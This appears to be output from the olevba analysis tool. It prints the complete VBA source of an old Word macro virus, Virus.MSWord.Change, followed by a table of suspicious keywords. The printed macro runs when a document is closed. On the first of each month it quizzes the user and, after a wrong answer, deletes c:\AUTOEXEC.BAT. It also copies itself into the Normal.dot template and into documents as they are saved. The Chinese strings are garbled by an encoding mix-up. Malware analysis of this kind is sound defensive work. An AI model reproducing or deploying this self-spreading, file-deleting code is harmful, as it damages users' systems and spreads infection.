olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Change-4338cc95a157cf0ecb8a5f938ec78b98f0680d7c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Change-4338cc95a157cf0ecb8a5f938ec78b98f0680d7c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: Virus.MSWord.Change-4338cc95a157cf0ecb8a5f938ec78b98f0680d7c - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub main()
Attribute main.VB_Description = "¥¨¶°«Ø¥ß©ó 97/10/31¡A«Ø¥ßªÌ X«Ø­õ!"
Attribute main.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoclose.main"
Dim ANSWER$
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
On Error Resume Next
If WordBasic.Day(WordBasic.Now()) = 1 Then GoTo CHNGMENU Else GoTo z
CHNGMENU:
WordBasic.RenameMenu "ÀÉ®×", "§Ú¬O¤Ñ¤~!", 0
Err.Number = 0
ANSWER$ = WordBasic.[InputBox$]("¤S¨ì¨C¤ë¤@¤é¤F!,¦Ò§A¤@ÃD°ÝÃD:¹q¸£³B²z­Ó¤H¸ê®Æ«OÅ@ªk³q¹L¬O¥»¤H¥Í¤é!§Ú¬O½Ö?", "@«Ø­õ¯f¬r@")
If ANSWER$ = "¶À«Ø­õ" Then GoTo message Else GoTo die
message:
WordBasic.MsgBox "§A«ç»òª¾¹D©O?"
WordBasic.MsgBox "®¥³ß! ®¥³ß! §Aµª¹ï¤F! §Ú¬O³ß·R¹q¸£ªº°ê¤¤¥Í~~", "¤£Â²³æËç!", 64
GoTo z
die:
WordBasic.Kill "c:\AUTOEXEC.BAT"
WordBasic.MsgBox "«Ü¥i±¤!§Ú¥u¦n³B»@§A!!!", "¤£Â²³æËç!", 32
WordBasic.MsgBox "¥»¨Ó§Ú¥u·|¼gWORD6.0&7.0ªº¥¨¶°¯f¬r,«á¨Ó²×©ó¦Û¤v·Q³q¤F·P¬V³¡¥÷!"
WordBasic.MsgBox "¤µ¤Ñ¯à°÷¼g¥X¯f¬r,¬O¦]¬°ºô¸ô¸ê·½ªºÂ×´I¨Ã¦³³\¦h¸ê°T,ÁÂÁÂ§A­Ì! "
GoTo z
z:

'WordBasic.ToolsMacro Name:="¥¨¶°1", Show:=0, Run:=1
nor = WordBasic.CountMacros(0)
If nor > 0 Then
For kk = 1 To nor
If WordBasic.[MacroName$](kk, 0) = "autoclose" Then
t = 1
End If
Next kk
End If
file$ = WordBasic.[FileName$]()
filem$ = file$ + ":autoclose"
If t <> 1 Then
  
  Application.OrganizerCopy Source:=file$, _
        Destination:="C:\Program Files\Microsoft Office\Templates\Normal.dot", _
        Name:="autoclose", Object:=wdOrganizerObjectProjectItems
End If
nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
For kkk = 1 To nor1
If WordBasic.[MacroName$](kkk, 1) = "autoclose" Then
tt = 1
End If
Next kkk
End If
If tt <> 1 Then
WordBasic.FileSaveAs Format:=1
file$ = WordBasic.[FileName$]()
filem$ = file$ + ":autoclose"
End If
If tt <> 1 Then
WordBasic.MacroCopy "autoclose", filem$, 1
exit_:
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

